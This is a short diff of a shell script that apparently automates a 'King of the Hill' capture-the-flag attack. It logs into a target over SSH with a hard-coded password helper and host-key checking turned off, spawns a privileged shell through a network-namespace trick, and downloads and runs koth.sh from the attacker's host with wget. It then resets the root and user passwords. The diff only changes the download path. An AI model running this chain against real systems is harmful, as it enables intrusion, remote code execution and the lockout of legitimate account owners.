@@ -61,7 +61,7 @@ sshpass -p "$ssh_pass" ssh -o StrictHostKeychecking=no neville@"$IP" -p "$SSH_PO
 
     ip netns add foo && ip netns exec foo /bin/sh -p
 
-    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
+    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
     echo "$new_password" | passwd --stdin root
     echo "$new_password" | passwd --stdin neville
     echo "$new_password" | passwd --stdin draco
